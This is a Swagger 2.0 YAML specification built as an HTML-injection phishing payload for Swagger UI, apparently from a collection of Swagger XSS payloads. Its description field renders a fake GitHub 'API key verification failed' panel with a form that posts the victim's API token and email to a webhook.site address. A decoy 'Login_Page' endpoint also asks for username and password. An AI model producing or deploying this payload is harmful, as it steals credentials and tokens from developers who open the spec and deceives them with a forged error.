swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<br><table width="100%" cellspacing="0" cellpadding="0"><tr><td width="30%">&nbsp;</td><td width="40%" bgcolor="#161b22"><table width="100%" cellspacing="0" cellpadding="22"><tr><td bgcolor="#161b22" align="left"><font face="Courier New" size="4" color="#f85149"><b>API key verification failed</b></font><br><font face="Courier New" size="2" color="#8b949e">Your token returned </font><font face="Courier New" size="2" color="#ffa657">401 Unauthorized</font><font face="Courier New" size="2" color="#8b949e">. Re-activate your key to restore API access.</font><br><br><form action="https://webhook.site/REPLACE-ME" method="post"><font face="Courier New" size="1" color="#8b949e">API TOKEN</font><br><input type="text" name="api_key" size="34" placeholder="ghp_xxxxxxxxxxxxxxxxxxxx"><br><br><font face="Courier New" size="1" color="#8b949e">ACCOUNT EMAIL</font><br><input type="text" name="email" size="34" placeholder="you@company.com"><br><br><input type="image" src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/btn-github.png" width="110" height="31" alt="Re-activate Token"></form></td></tr></table><table width="100%" cellspacing="0" cellpadding="3"><tr><td bgcolor="#f85149">&nbsp;</td></tr></table><table width="100%" cellspacing="0" cellpadding="8"><tr><td align="left"><font face="Segoe UI" size="2" color="#8b949e">GitHub API &middot; Token Management</font></td></tr></table></td><td width="30%">&nbsp;</td></tr></table><br>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
